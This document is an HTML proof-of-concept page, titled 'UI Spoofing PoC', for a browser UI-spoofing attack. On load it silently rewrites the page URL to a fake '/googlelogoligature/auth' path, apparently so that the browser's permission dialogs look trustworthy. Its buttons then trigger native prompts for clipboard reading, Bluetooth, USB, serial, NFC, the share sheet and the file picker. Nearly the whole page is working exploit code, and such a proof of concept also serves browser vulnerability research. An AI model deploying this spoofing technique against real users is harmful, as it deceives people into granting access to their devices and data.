<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UI Spoofing PoC</title>
    <style>
        body {
            background-color: #121212;
            color: #e0e0e0;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
            max-width: 600px;
            margin: 0 auto;
        }
        h3 {
            color: #ffffff;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
            margin-top: 0;
        }
        p { font-size: 14px; color: #888; }
        
        .api-list {
            display: flex;
            flex-direction: column;
            gap: 10px;
            margin-top: 20px;
        }
        button {
            background-color: #1e1e1e;
            color: #ccc;
            border: 1px solid #444;
            padding: 12px;
            font-family: 'Courier New', Courier, monospace;
            font-size: 14px;
            cursor: pointer;
            text-align: left;
            transition: background 0.2s, border-color 0.2s;
        }
        button:hover {
            background-color: #2a2a2a;
            border-color: #666;
            color: #fff;
        }
        #log-box {
            margin-top: 25px;
            padding: 15px;
            background: #000;
            border: 1px dashed #555;
            font-size: 12px;
            min-height: 60px;
            color: #0f0;
            word-wrap: break-word;
        }
    </style>
</head>
<body>

    <h3>Security Module Test</h3>
    <p>> Init URL path injection...</p>
    <p>> Select API to trigger OS dialog:</p>

    <div class="api-list">
        <button id="btn-clip">[+] navigator.clipboard.readText()</button>
        <button id="btn-bt">[+] navigator.bluetooth.requestDevice()</button>
        <button id="btn-usb">[+] navigator.usb.requestDevice()</button>
        <button id="btn-serial">[+] navigator.serial.requestPort()</button>
        <button id="btn-nfc">[+] NDEFReader.scan() (Web NFC)</button>
        
        <button id="btn-share">[+] navigator.share() (Share Sheet)</button>
        <button id="btn-file">[+] window.showOpenFilePicker()</button>
    </div>

    <div id="log-box">waiting for user interaction...</div>

    <script>
        const logBox = document.getElementById('log-box');
        const log = (msg) => { 
            logBox.innerText = `> ${msg}`; 
            console.log(msg);
        };

        // 1. SILENT PATH INJECTION
        window.onload = function () {
            const magicString = "googlelogoligature";
            const spoofedPath = "/" + magicString + "/auth";
            window.history.replaceState(null, "", spoofedPath);
        };

        // 2. EVENT LISTENERS
        document.getElementById('btn-clip').onclick = async () => {
            log("Triggering clipboard read prompt...");
            try {
                await navigator.clipboard.readText();
                log("SUCCESS: Clipboard access granted.");
            } catch(e) { log(`ERR: ${e.message}`); }
        };

        document.getElementById('btn-bt').onclick = async () => {
            log("Triggering Bluetooth chooser...");
            try {
                await navigator.bluetooth.requestDevice({ acceptAllDevices: true });
                log("SUCCESS: Bluetooth device selected.");
            } catch(e) { log(`ERR: ${e.message}`); }
        };

        document.getElementById('btn-usb').onclick = async () => {
            log("Triggering USB chooser...");
            try {
                await navigator.usb.requestDevice({ filters: [] });
                log("SUCCESS: USB device selected.");
            } catch(e) { log(`ERR: ${e.message}`); }
        };

        document.getElementById('btn-serial').onclick = async () => {
            log("Triggering Serial Port chooser...");
            try {
                await navigator.serial.requestPort();
                log("SUCCESS: Serial port selected.");
            } catch(e) { log(`ERR: ${e.message}`); }
        };

        document.getElementById('btn-nfc').onclick = async () => {
            log("Triggering Web NFC scanner...");
            try {
                const ndef = new NDEFReader();
                await ndef.scan();
                log("SUCCESS: NFC scanner active.");
            } catch(e) { log(`ERR: ${e.message}`); }
        };

        document.getElementById('btn-share').onclick = async () => {
            log("Triggering Native Share Sheet...");
            try {
                await navigator.share({
                    title: 'Security Sync',
                    text: 'Synchronize device data',
                    url: window.location.href
                });
                log("SUCCESS: Share sheet opened.");
            } catch(e) { log(`ERR: ${e.message}`); }
        };

        document.getElementById('btn-file').onclick = async () => {
            log("Triggering Native File Picker...");
            try {
                await window.showOpenFilePicker();
                log("SUCCESS: File picker opened.");
            } catch(e) { log(`ERR: ${e.message}`); }
        };
    </script>
</body>
</html>
